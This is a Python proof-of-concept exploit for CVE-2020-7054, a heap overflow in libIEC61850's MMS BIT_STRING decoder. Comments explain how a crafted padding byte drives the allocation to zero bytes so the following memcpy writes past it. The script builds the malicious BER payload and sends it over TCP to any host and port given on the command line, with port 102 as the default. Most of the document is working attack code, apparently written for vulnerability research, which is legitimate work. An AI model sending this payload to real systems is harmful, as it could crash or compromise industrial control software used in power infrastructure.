#!/usr/bin/env python3
"""
CVE-2020-7054 PoC - libIEC61850 <= 1.4.0 heap overflow in
MmsValue_decodeMmsData() parsing an MMS_BIT_STRING (BER tag 0x84).

Wire framing for the real-CVE harness (mms_cve_2020_7054_real.c):
    [4-byte big-endian length L][L bytes of raw MMS Data element]
The L bytes are fed verbatim to MmsValue_decodeMmsData().

BIT_STRING bug:
    bitStringLength = (8 * (dataLength - 1)) - padding   # bits
    newBitString(bitStringLength) -> allocs (|bits|+7)/8 bytes
    memcpy(buf, content+1, dataLength - 1)               # writes dataLength-1 bytes
A long BER length whose declared dataLength exceeds the bytes actually present,
with the first content byte (padding) crafted, makes newBitString() size the
heap chunk smaller than the (dataLength-1)-byte memcpy -> heap write overflow.

Usage: python3 mms_cve_2020_7054_real_poc.py [host] [port]
"""
import socket
import struct
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 102


def ber_len(n: int) -> bytes:
    """BER definite length encoding."""
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def bitstring_payload(declared_len: int, content: bytes) -> bytes:
    """
    tag 0x84, BER length = declared_len, then `content`.
    The first content byte is the BIT_STRING padding; the rest is data.
    `declared_len` is the dataLength the decoder trusts for the memcpy size;
    making it larger than len(content) is what overflows the heap chunk that
    newBitString() sized from (8*(declared_len-1) - padding) bits.
    """
    return bytes([0x84]) + ber_len(declared_len) + content


def send(payload: bytes, label: str) -> None:
    print(f"[*] {label}: {len(payload)} B {payload.hex()}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))
    s.sendall(struct.pack(">I", len(payload)) + payload)
    try:
        s.recv(64)
    except Exception:
        pass
    s.close()


def main() -> None:
    # v1.4.0 BIT_STRING (0x84) decode has NO `padding > 7` check (that guard was
    # the later fix). The padding byte is buffer[bufPos], fully attacker
    # controlled (0..255):
    #     bitStringLength = (8 * (dataLength - 1)) - padding;   # can be 0/negative
    #     value = MmsValue_newBitString(bitStringLength);       # size = abs(bits)
    #         -> alloc = (size/8 + (size%8>0)) bytes
    #     memcpy(buf, content+1, dataLength - 1);               # copies dataLength-1
    # Pick dataLength so the WHOLE element is in-frame (BerDecoder_decodeLength
    # enforces bufPos+dataLength <= L, so the length is valid), and padding so
    # the allocation collapses far below dataLength-1:
    #   dataLength = 20  -> copy = 19 bytes
    #   padding    = 152 -> bitStringLength = 8*19 - 152 = 0 -> alloc = 0 bytes
    # => memcpy WRITE of 19 bytes into a 0-byte heap chunk. Native ASan abort.
    DATALEN = 20
    PADDING = 8 * (DATALEN - 1)  # 152 -> bitStringLength == 0 -> 0-byte alloc
    content = bytes([PADDING]) + b"\x41" * (DATALEN - 1)
    assert len(content) == DATALEN
    payload = bitstring_payload(DATALEN, content)  # all in-frame: L = DATALEN + 2
    send(payload, f"BIT_STRING overflow (dataLength={DATALEN}, padding={PADDING}, alloc=0)")
    print("[*] sent (expect ASan heap-buffer-overflow WRITE in MmsValue_decodeMmsData:225)")


if __name__ == "__main__":
    main()
